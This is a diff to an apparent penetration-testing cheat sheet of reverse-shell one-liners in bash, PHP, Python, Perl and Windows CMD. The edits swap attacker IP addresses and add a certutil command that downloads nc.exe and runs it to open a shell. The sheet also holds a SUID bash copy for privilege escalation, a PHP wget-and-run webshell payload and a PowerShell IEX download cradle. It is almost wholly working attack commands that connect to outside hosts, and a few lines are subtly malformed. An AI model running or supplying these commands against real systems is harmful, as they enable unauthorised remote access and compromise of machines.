@@ -2,7 +2,7 @@
 
 #### BASH
 ```bash
-bash -i >& /dev/tcp/192.168.45.238/60001 0>&1
+bash -i >& /dev/tcp/192.168.45.178/60001 0>&1
 
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/pwned\nchmod 4777 /tmp/pwned' > full-checkup.sh
 chmod +x full-checkup.sh
@@ -11,13 +11,13 @@ chmod +x full-checkup.sh
 #### PHP
 
 ```bash
-php -r '$sock=fsockopen("192.168.45.238", 60001);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.45.178", 60001);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 cp /usr/share/webshells/php/php-reverse-shell.php .
 mv php-reverse-shell.php shell.php
 python3 -m http.server
 nc -nlvp 443
-<?php system("wget http://192.168.45.238/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
+<?php system("wget http://192.168.45.178/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
 
 cp /usr/share/webshells/php/php-reverse-shell.php .
 python3 -m http.server 800
@@ -46,7 +46,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 nc -nlvp 22
 or
 
-
+192.168.49.140
 
 #### Python
 
@@ -60,6 +60,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.163 80 >/tmp/f
 
 busybox nc $ip 5000 -e /bin/bash
+
+certutil.exe -urlcache -split -f http://192.168.45.195:443/nc.exe C:\Windows\Tasks\nc.exe & C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.195 80
 ```
 
 #### Perl
@@ -71,7 +73,7 @@ perl -e 'use Socket:$i="192.168.45.163";$0=443;socket(S,PF INET,SOCK STREAM, get
 #### CMD
 
 ```bash
-'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell 
+'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.140:8000/rev.ps1") | powershell 
 -noprofile'
 ````
 
